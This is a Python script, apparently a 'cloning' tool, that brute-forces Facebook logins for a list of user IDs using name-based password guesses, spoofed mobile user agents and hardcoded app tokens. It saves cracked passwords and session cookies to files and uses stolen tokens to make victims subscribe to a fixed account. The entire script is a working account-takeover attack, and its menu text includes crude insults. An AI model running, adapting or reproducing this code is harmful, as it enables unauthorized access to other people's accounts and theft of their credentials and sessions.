#coding = utf-8
#This Open-Source Script by Aqib Gando ghasti ka bacha
#Please Donot Forget to give Credit 
#Whatsapp : +
import os
import sys
import re
import random,zlib
import time
from time import sleep as sp
import string,json
import subprocess
import base64,uuid
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpd
 
 
try:
	import requests
except ImportError:
	os.system('pip install requests')
 
 
ses = requests.Session()
 
id = []
ok = []
cp =[]
loop = 0
pwx = []
method = []
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
import random
import string
model2 ="""M2101K6G
Aquaris U Plus
CPH2451
CPH2419
CPH2389
CPH2351
CPH2332
CPH2331
CPH2261
CPH2238
CPH2107
CPH2048
CPH1929
CPH1985
CPH1869
CPH1615
CPH1664
CPH1451
CPH1235
CPH1114
22122RK93C
22041216C
2201117TY
2304FPN6DC
22101316UP
2206122SC
2106118C
21091116UI
M2105K81AC
M2101K6G
Redmi Note 10 Lite
M2003J15SC
MI CC9 Pro
2201116TG
22041216UC
21061119DG
Mi 9T
2304FPN6DG
SM-G780G
SM-O497J
SM-L427V
SM-C297Z
SM-G507X
SM-Y634L
SM-J204F
SM-R911A
SM-X801O
SM-A792E
SM-H270F
SM-P993J
SM-V233F
SM-O861W
SM-D182C
SM-Y729G
SM-Z367Q
SM-U191O
SM-U559U
SM-B567Y
SM-O846M
SM-G342Z
SM-K531M
SM-I847H
SM-A728M
SM-L637H
SM-L429N
SM-P413J
SM-N731T
SM-R505B
SM-A744X
SM-O400L
SM-F799H
SM-Z679E
SM-G822H
SM-N489K
SM-Z200Z
SM-Y119O
SM-E201F
SM-N785T
SM-G200V
SM-R067J
SM-N134B
SM-N227J
SM-K221P
SM-S150D
SM-A869J
SM-H143V
SM-C469H
SM-T152I
SM-Y575D
SM-W880B
SM-W460Q
SM-Q159J
SM-U637R
SM-J924Q
SM-W512P
SM-I745B
SM-O118H
SM-U111M
SM-U522B
SM-B611V
SM-G520J
SM-D144B
SM-C181B
SM-V128Q
SM-U167W
SM-L098E
SM-P454L
SM-L943O
SM-D368H
SM-P485X
SM-C715N
SM-H010U
SM-H710B
SM-X633F
SM-Z040T
SM-Q391G
SM-N451P
SM-T115B
SM-R248C
SM-T618P
SM-S067L
SM-M619P
SM-Q048A
SM-I787D
SM-X275W
SM-G911F
SM-R924W
SM-S506Z
SM-V941V
SM-G016M
SM-O008J
SM-L296E
SM-U876V
SM-L600X
SM-G169P
SM-F578L
SM-S727V
SM-F213B
SM-U822H
SM-Q995Y
SM-I602I
SM-V225C
SM-U921J
SM-Z302E
SM-Y080Z
SM-X174G
SM-T157W
SM-M311W
SM-H791P
SM-Q343U
SM-H261C
SM-D442E
SM-E047H
SM-S082M
SM-U311K
SM-Z651V
SM-I566H
SM-I593C
SM-L375P
SM-D399D
SM-Y086S
SM-O365U
SM-W782A
SM-S236Q
SM-D514J
SM-W806F
SM-W809F
SM-M645P
SM-W098A
SM-O026U
SM-Y689Z
SM-D832N
SM-C691X
SM-D921H
SM-G403Y
SM-S210U
SM-D768K
SM-F912H
SM-H856A
SM-J184W
SM-D512U
SM-K786Z
SM-Z107O
SM-D499G
SM-C815N
SM-D590H
SM-V695N
SM-M093A
SM-S354P
SM-F657J
SM-R743O
SM-A180A
SM-B651H
SM-X279B
SM-X429B
SM-R588G
SM-Y318K
SM-G967W
SM-P668C
SM-B401K
SM-S853U
SM-A377K
SM-K914A
SM-J624R
SM-L536Y
SM-B190B
SM-Q769S
SM-Z872L
SM-S322A
SM-O621Y
SM-N100L
SM-A840S
SM-E543H
SM-H386M
SM-Y932W
SM-T496G
SM-E768E
SM-R031A
SM-Q015D
SM-P522K
SM-D436Z
SM-R077U
SM-I233Z
SM-H906Q
SM-K838M
SM-O369U
SM-F458K
SM-M382E
SM-L337L
SM-G904B
SM-N351H
SM-V670M
SM-W266H
SM-Q576G
SM-G359C
SM-R096P
SM-F952H
SM-Y608N
SM-C736V""".splitlines()
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
def randBuildLMK():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/257.0.0.44.118;FBBV/197851400;FBDM/{density=2.25,width=720,height=1280};FBLC/en_US;FBRV/201443087;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S367VL;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
def randFBAN():
  VAPP = random.randint(410000000,499999999)
  ua="[FBAN/FB4A;FBAV/384.0.0.13166;FBBV/"+str(VAPP)+";FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/620570855;FBCR/1030;FBMF/Huawei;FBBD/MHA-L29;FBPN/com.facebook.katana;FBDV/"+random.choice(model2)+";FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
  return ua
def randBuildvsskj():
    END = '[FBAN/FBIOS;FBDV/iPad13,1;FBMD/iPad;FBSN/iPadOS;FBSV/15.4.1;FBSS/2;FBID/tablet;FBLC/en_GB;FBOP/5]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
sys.stdout.write('\x1b]2; DANGER\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
 
 
##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'

print("EssA")

#________________________________________#
def clear():
    os.system('clear')
    print(logo)
try:
	pro = requests.get('https://raw.githubusercontent.com/AKING110/files/main/.prox.txt').text
	open('.prox.txt','w').write(pro)
	proxxx = open('.prox.txt','r').read().splitlines()
except requests.exceptions.ConnectionError:
	exit(" Connection Error ")
def linex():
#def clear():
	os.system("clear")
 
def line():
	print(52*'-')
def p(x):
	print(x)
 
def logo():
	logo = (f'''\033[1;97m                                    
@@@@@@@   @@@  @@@       @@@  @@@  @@@@@@@  @@@@@@@@  
@@@@@@@@  @@@  @@@       @@@  @@@  @@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@!       @@!  @@@    @@!    @@!       	
\033[1;96m!@!  @!@  !@!  !@!       !@!  @!@    !@!    !@!       
@!@  !@!  !!@  @!!       @!@  !@!    @!!    @!!!:!    
\033[1;97m!@!  !!!  !!!  !!!       !@!  !!!    !!!    !!!!!:    
!!:  !!!  !!:  !!:       !!:  !!!    !!:    !!:       
:!:  !:!  :!:   :!:      :!:  !:!    :!:    :!:       
 :::: ::   ::   :: ::::  ::::: ::     ::     :: ::::  
:: :  :   :    : :: : :   : :  :      :     : :: ::   
[<>] The Original Codes are Written by Dilute Codes
---------------------------------------------------
 ╰◈▪➣ Github    : https://github.com/Dilute Codes
 ╰◈▪➣ Facebook  : 033[92;1m
 ╰◈▪➣ Author    : fat condem ka nateeja = Dilute Codes( Ghasti maa ka Beta )
 ╰◈▪➣ Version   : DC Extreme [2.5]
 ╰◈▪➣   \033[1;96mNaam Ki Dosti Kaam ki Yaari\n\tDosron Ki Tarah ! Adat Nhi Hamari \033[1;97m
---------------------------------------------------''')
	p(logo)
 
 
def x():
	fban = random.choice(["FB4A"])
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	fbcr = random.choice(['Nepal_Telecom', 'Banglalink', 'Robi', 'Grameenphone', 'Airtel'])
	fblc = random.choice(["en_US", "en_GB"])
	fbbd = 'Oppo'
	fbpn = random.choice(["com.facebook.katana"])
	fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	fbmf = 'Oppo','samsung','Redmi'
	build = random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
	fbdv = random.choice(["Redmi Note 7", "Redmi Note 8", "Redmi Note 9", "Redmi Note 10", "Redmi 7", "Redmi 8", "Redmi 9", "Redmi 10", "Redmi 9A", "Redmi 9C", "Redmi K20", "Redmi K30", "Redmi K40", "Redmi 5A", "Redmi 6A", "Redmi 7A", "Redmi 8A", "Redmi 9T", "Redmi Note 7 Pro", "Redmi Note 8 Pro", "Redmi Note 4", "Redmi Note 5", "Redmi Note 6 Pro", "Redmi 4X", "Redmi Y2", "Redmi Note 8T"])
	END = f"[FBAN/FBIOS;FBDV/iPad13,6;FBMD/iPad;FBSN/iPadOS;FBSV/17.0.1;FBSS/2;FBID/tablet;FBLC/en_Qaau_US;FBOP/5]"
	ua = f'Dalvik/2.1.0 (Linux; U; Android 13 {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	return ua

def xx():
	fbav = str(random.randint(273,555))+'.1.0.'+str(random.randrange(20,70))+'.'+str(random.randint(111,555))
	fbbv=str(random.randint(00000000,99999999))
	oppo = random.choice(["CNM632", "CPH1114", "CPH1235", "CPH1451", "CPH1615", "CPH1664", "CPH1869", "CPH1929", "CPH1985",
    "CPH2048", "CPH2107", "CPH2238", "CPH2261", "CPH2331", "CPH2332", "CPH2351", "CPH2389", "CPH2451",
    "CPH2491", "CPH2513", "CPH2515", "CPH2519", "CPH2521", "CPH2523", "CPH2525", "CPH2529", "CPH2551",
    "CPH2569", "CPH2579", "CPH2589", "CPH2591", "CPH2643", "CPH3475", "CPH3669", "CPH3682", "CPH3731",
    "CPH3776", "CPH3785", "CPH4125", "CPH4275", "CPH4299", "CPH4395", "CPH4473", "CPH4987", "CPH5286",
    "CPH5841", "CPH5947", "CPH6178", "CPH6244", "CPH6271", "CPH6316", "CPH6519", "CPH6528", "CPH6697",
    "CPH7338", "CPH7364", "CPH7382", "CPH7532", "CPH7577", "CPH7948", "CPH7991", "CPH8153", "CPH8346",
    "CPH8347", "CPH8363", "CPH8393", "CPH8467", "CPH8472", "CPH8534", "CPH8686", "CPH8893", "CPH9177",
    "CPH9226", "CPH9659", "CPH9667", "CPH9716", "CPH9763", "CPH9839", "CPH9929"])
	ua ='Mozilla/5.0 (iPad; CPU OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBAV/'+fbav+';FBBV/'+fbbv+';FBDV/iPad6,11;FBMD/iPad;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5;FBRV/'+str(random.randint(00000000,99999999))+']'
	return ua
 
 
def xxx():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	fbcr = random.choice(['Nepal_Telecom', 'DOCTYPE', 'MTN-CG', 'null', 'Salaam Telecom', 'BASE'])
	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	fbsv = f"{random.randint(4, 13)}"
	build = random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
	fbdv = random.choice(['Redmi Note 9','Redmi Note 10','Redmi Note 10S','Redmi Note 10 Pro'])
	END = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FBIOS;FBDV/iPad3,3;FBMD/iPad;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5;FBCR/]"
	ua = f'Davik/2.1.0 (Linux; U; Android {fbsv}; {str(fbdv)} Build/'+str(build)+') '+END
	return ua
 
# USER AGENT FUNCTION UA 1 METHOD 1
def xd3():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(12,99))+'.0.0.'+str(random.randint(6666,9999))+';FBBV/'+str(random.randint(6666666,9999999))+';[FBAN/FBIOS;FBDV/iPad7,2;FBMD/iPad;FBSN/iOS;FBSV/13.5.1;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]'
        return ua
 
	
class Main:
	def __init__(self):
		os.system('clear')
	def saved_results(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			p('\n')
			line()
			p(' [•] Cloning Process Has Been Completed ')
			p(' [•] Total OK Accounts : %s '%(len(ok)))
			p(' [•] Total CP Accounts : %s '%(len(cp)))
			line()
			input(' [•] Press Enter To Go Back To Main Menu ')
			self.menu()
	def menu(self):
		logo()
		p(' [•] This Script is Free Open-Souce by Minahil  ')
		line()
		p(' [1] File Cracking ')
		p(" [2] Join Dilute Coders Facebook Group ")
		p(' [3] Join Dilute Coders Whatsapp Group ')
		line()
		m_1 = input(' [•] Choose : ')
		if m_1 == '1':
			self.methods_menu()
		elif m_1 == '2':
			os.system('xdg-open https://facebook.com/groups/124939013896146/')
			sp(1)
			self.menu()
		elif m_2 =='3':
			os.system('xdg-open https://chat.whatsapp.com/GzUiQ51HrLpDzebhrmsgYh')
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.menu()
	def methods_menu(self):
		line()
		p(' [1] Method 1 \n [2] Method 2 \n [3] Method 3')
		line()
		m_2 = input(' [•] Select Method : ')
		if m_2 == '1':
			method.append('i')
			self.cracking()
		elif m_2 == '2':
			method.append('ii')
			self.cracking()
		elif m_2 == '3':
			method.append('iii')
			self.cracking()
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.methods_menu()
 
	def cracking(self):
		clear()
		logo()
		try:
			file = input(' [•] Put File Path : ')
			id = open(file).read().splitlines()
			self.password_menu(id)
		except FileNotFoundError:
			p(' [X] File Path Wrong....')
			sp(2)
			self.cracking()
 
	def password_menu(self,id):
		clear()
		logo()
		p(' [•] Enter Password Limit Between 1 to 20 (Max) ')
		try:
			plimit = int(input(' [•] Put Limit : '))
			if plimit == '':
				plimit = 4
			elif plimit > 20:
				limit = 10
		except:
			plimit = 4
		clear();logo()
		print(' [•] Example : first123,last1122,firstlast,last Etc ')
		for n in range(plimit):
			pwx.append(input(' [•] Put Password %s : '%(n+1)))
		clear();logo()
		p(' [•] Dilute Brute Has Been Started ')
		line()
		p(' [•] Total Clone Accounts :  %s '%(len(id)))
		line()
		p(' [•] Use Flight ( Jahaz ) Mode Before / During Cloning ')
		line()
		with tpd(max_workers=30) as saqi:
			for user in id:
				uid,nm = user.split('|')
				if 'i' in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif 'ii' in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif 'iii' in method:
					saqi.submit(self.method3,uid,nm,pwx)
		self.saved_results(ok,cp)
 
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [AQIB] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				accees_token = ('350685531728|62f8ce9f74b12f84c123cc23437a4a32')
				ua="FBAV/"+str(random.choice(range(130,320)))+".0.0.0."+str(random.choice(range(130,320)))+";FBPN/com.facebook.orca;FBLC/th_TH;FBBV/"+str(random.choice(range(100000000,444444444)))+"; [FBAN/FB4A;FBAV/261.0.0.52.126;FBBV/202681550;FBDM/{density=2.0,width=720,height=1280};FBLC/fr_DZ;FBRV/0;FBCR/null;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
				head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
				data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':uid,'password':pw,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'fr_DZ','client_country_code':'DZ','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
				url = 'https://b-graph.facebook.com/auth/login'
				q = ses.post(url,data=data,headers=head,allow_redirects=False).json()
				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[AQIB-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/AQIB_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/AQIB_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					session = q['session_cookies']
					cookie = ''
					cuser = session[0]
					cuser = session[0]['name']+'='+session[0]['value']
					cookie+=cuser+';'
					xs = session[1]['name']+'='+session[1]['value']
					cookie+=xs+';'
					fr = session[2]['name']+'='+session[2]['value']
					cookie+=fr+';'
					datr = session[3]['name']+'='+session[3]['value']
					cookie+=datr+'; dpr=2; locale=en_US; wd=950x1835; '
					pagevoice = cuser.replace('c_user','m_page_voice')
					cookie+=pagevoice
					print('\033[1;37m [🍪] Cookies :- '+cookie)
					token = q['access_token']
					requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token)
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[AQIB-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/AQIB_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method1(uid,nm,pwx)
 
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [AQIB] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				
				client_id = '1348564698517390'
				client_secrets = '007c0a9101b9e1c8ffab727666805038'
				version = str(random.randrange(8,15))
				osv = str(random.randrange(1,9))
				osvx = str(random.randrange(1,15))
				osv1 = str(random.randrange(1,9))
				osv2 = str(random.randrange(1,9))
				abv = ['A','B','C']
				if '8' in version:
					ipsw = '12'+random.choice(abv)+str(random.randint(11,99))
				elif '9' in version:
					ipsw = '13'+random.choice(abv)+str(random.randint(11,99))
				elif '10' in version:
					ipsw = '14'+random.choice(abv)+str(random.randint(11,99))
				elif '11' in version:
					ipsw = '15'+random.choice(abv)+str(random.randint(11,99))
				elif '12' in version:
					ipsw = '16'+random.choice(abv)+str(random.randint(11,99))
				elif '13' in version:
					ipsw = '17'+random.choice(abv)+str(random.randint(15,99))
				elif '14' in version:
					ipsw = '18'+random.choice(abv)+str(random.randint(15,99))
				elif '15' in version:
					ipsw = '19'+random.choice(abv)+str(random.randint(15,99))
				fbav = str(random.randint(151,555))+'.0.0.'+str(random.randrange(9,70))+'.'+str(random.randint(151,555))
				fbbv=str(random.randint(00000000,99999999))
				ua_ios = 'Mozilla/5.0 (iPhone, CPU iPhone '+version+'_'+osv+' like Mac OS '+version+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+ipsw+f' [FBAN/FBIOS;FBAV/'+fbav+';FBBV/'+fbbv+';FBDV/iPhone'+version+','+osv+';FBMD/iPhone;FBSN/iOS;FBSV/'+osvx+'.'+osv1+';FBSS/2;FBCR/;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/0]'
				adid = str(uuid.uuid4())
				device_id = str(uuid.uuid4())
				li = ['28','29','210']
				li2 = random.choice(li)
				#j1 = ''.join(random.choice(digits) for _ in range(2))
				#j2 = li2+j1
				data = {
				'adid':adid,
				'format':'json',
				'api_key':'6628568379',
				'community_id':'',
				'device_id':device_id,
				'family_device_id':device_id,
				'currently_logged_in_userid':'0',
				'try_num':'1',
				'email':uid,
				'password':pw,
				'jazoest':'25'+str(random.randint(111,999)),
				'generate_analytics_claim':'1',
				'cpl':'true',
				'generate_session_cookies':'1',
				'credentials_type':'password',
				'error_detail_type':'button_with_disabled',
				'source':'auth.login',
				'locale':'fr_DZ',
				'client_country_code':'DZ',
				'advertising_id':adid,
				'meta_inf_fbmeta':'NO_FILE',
				'access_token':'1348564698517390|007c0a9101b9e1c8ffab727666805038'
				}
				head = {
				'Authorization':'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662',
				'X-FB-Connection-Quality':'EXCELLENT',
				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
				'x-fb-net-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),
				'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
				'x-fb-friendly_name':'authenticate',
				'content-encoding':'application/x-www-form-urlencoded',
				'x-tigon-is_retry':'true',
				'x-fb-http-engine':'Liger',
				'x-requested-with':'FBIOS',
				'connection':'close',
				'user-agent':xx()
				}
				proxs = {'http': 'socks5://'+random.choice(proxxx)}
				#url = 'https://b-api.facebook.com/method/auth.login'
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=head, allow_redirects=False).json()
				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[AQIB-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					
					open('/sdcard/AQIB_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/AQIB_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					session = q['session_cookies']
					cookie = ''
					cuser = session[0]
					cuser = session[0]['name']+'='+session[0]['value']
					cookie+=cuser+';'
					xs = session[1]['name']+'='+session[1]['value']
					cookie+=xs+';'
					fr = session[2]['name']+'='+session[2]['value']
					cookie+=fr+';'
					datr = session[3]['name']+'='+session[3]['value']
					cookie+=datr+'; dpr=2; locale=en_US; wd=950x1835; '
					pagevoice = cuser.replace('c_user','m_page_voice')
					cookie+=pagevoice
					print('\033[1;37m [🍪] Cookies :- '+cookie)
					#token = q['access_token']
					#requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token)
					
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[AQIB-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/AQIB_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			time.sleep(5)
			self.method2(uid,nm,pwx)
		except Exception as e:pass
		
 
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [AQIB] %s | M3 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				random_seed=random.Random()
				adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
				url = f"https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true"
				data = {"adid": adid,
                     "device_id": str(uuid.uuid4()),
                     "family_device_id": str(uuid.uuid4()),
                     "secure_family_device_id": str(uuid.uuid4()),
                     "advertiser_id": str(uuid.uuid4()),
                     "format": "json",
                     "cpl": "true",
                     "credentials_type": "device_based_login_password",
                     "error_detail_type": "button_with_disabled",
                     "source": "register_api",
                     "email": uid,
                     "password": pw,
                     "access_token": "275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                     "generate_session_cookies": "1",
                     "meta_inf_fbmeta": "NO_FILE",
                     "currently_logged_in_userid": "0",
                     "locale": "en_US",
                     "client_country_code": "US",
                     "method": "auth.login",
                     "fb_api_req_friendly_name": "authenticate",
                     "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                     "api_key": "882a8490361da98702bf97a021ddc14d",
                     "sig": "cc331688c9ec07059af4df9dbdcf7737"}
				head = {"User-Agent": xx(),
                    "Accept-Encoding": "gzip,deflate",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Host": "b-graph.facebook.com",
                    "Authorization": "OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                    "X-FB-Net-HNI": str(random.randrange(20000, 40000)),
                    "X-FB-SIM-HNI": str(random.randrange(20000, 40000)),
                    "X-FB-Client-IP": "True",
                    "X-FB-Request-Analytics-Tags": "graphservice",
                    "X-Tigon-Is-Retry": "False",
                    "X-FB-HTTP-Engine": "Liger",
                    "X-FB-Connection-Quality": "MOBILE.LTE",
                    "X-FB-Server-Cluster": "True",
                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                    "X-FB-Connection-Bandwidth": str(random.randrange(40000000, 90000000)),
                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
                    "X-FB-Connection-Type": "MOBILE.LTE",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "795"}
				q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[AQIB-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/AQIB_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/AQIB_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					session = q['session_cookies']
					cookie = ''
					cuser = session[0]
					cuser = session[0]['name']+'='+session[0]['value']
					cookie+=cuser+';'
					xs = session[1]['name']+'='+session[1]['value']
					cookie+=xs+';'
					fr = session[2]['name']+'='+session[2]['value']
					cookie+=fr+';'
					datr = session[3]['name']+'='+session[3]['value']
					cookie+=datr+'; dpr=2; locale=en_US; wd=950x1835; '
					pagevoice = cuser.replace('c_user','m_page_voice')
					cookie+=pagevoice
					print('\033[1;37m [🍪] Cookies :- '+cookie)
					token = q['access_token']
					requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token)
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[AQIB-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/AQIB_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method3(uid,nm,pwx)
 
		exit()
if __name__=="__main__":
	Main().menu()
 #